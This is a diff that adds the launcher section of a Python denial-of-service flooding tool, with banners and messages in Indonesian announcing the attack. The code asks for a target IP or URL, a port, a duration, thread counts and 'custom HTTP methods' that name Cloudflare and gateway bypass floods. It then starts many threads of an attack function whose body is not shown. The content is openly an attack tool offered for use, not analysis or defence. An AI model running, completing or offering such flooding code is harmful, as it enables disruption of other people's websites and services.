@@ -112,3 +112,35 @@ banner = f"""
 {Fore.RED}┣{Fore.YELLOW}                       BY: KF'24
 {Fore.RED}┣{Fore.BLUE}                          —oO0Oo—
 {Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+===>> 35 DETIK UNTUK MEMULAI SERANGAN...!! <==={Fore.RESET}"""
+
+print(banner)
+host = ""
+ip = ""
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL==⟩⟩ {Fore.WHITE} ")
+port_loader = int(input(f"{Fore.YELLOW}PORT==⟩⟩ {Fore.YELLOW} "))
+time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩ {Fore.WHITE} "))
+spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩ {Fore.YELLOW} "))
+create_thread = int(input(F"{Fore.CYAN}CREATE THREAD (DEFAULT=35)==⟩⟩ {Fore.WHITE}"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩ {Fore.WHITE} "))
+print(f"{Fore.YELLOW} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
+print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
+methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
+print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
+try:
+    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    exit()
+for loader_num in range(create_thread):
+    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
+    sys.stdout.flush()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+clear_text()
+print(banner)
+status_code = True
+print(f"{Fore.GREEN}MULAI MENYERANG . . .{Fore.RESET}")
